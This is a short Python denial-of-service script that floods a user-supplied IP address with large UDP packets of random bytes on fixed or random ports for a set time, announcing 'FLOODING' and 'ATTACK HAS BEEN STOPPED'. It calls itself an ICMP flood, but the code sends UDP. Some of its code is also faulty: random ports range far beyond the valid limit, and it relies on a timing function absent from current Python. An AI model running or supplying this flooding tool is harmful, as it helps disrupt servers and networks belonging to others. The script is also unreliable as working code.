#!/usr/bin/python



import socket,random,sys,time



if len(sys.argv)==1:

    sys.exit('[XSS CUSTOM]: ./ICMP [IP] [PORT] [TIME]')



def ICMP_protocol():

    port = int(sys.argv[2])

    randport=(True,False)[port==0]

    ip = sys.argv[1]

    dur = int(sys.argv[3])

    clock=(lambda:0,time.clock)[dur>0]

    duration=(1,(clock()+dur))[dur>0]
	
    
    print('[ICMP] FLOODING %s ON PORT %s !'%(ip, port or 'infinite'))
	
	
    sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

    bytes=random._urandom(15000)

    while True:

        port=(random.randint(1,15000000),port)[randport]

        if clock()<duration:

            sock.sendto(bytes,(ip,port))

        else:

            break

    print('[ICMP] ATTACK HAS BEEN STOPPED !')

ICMP_protocol()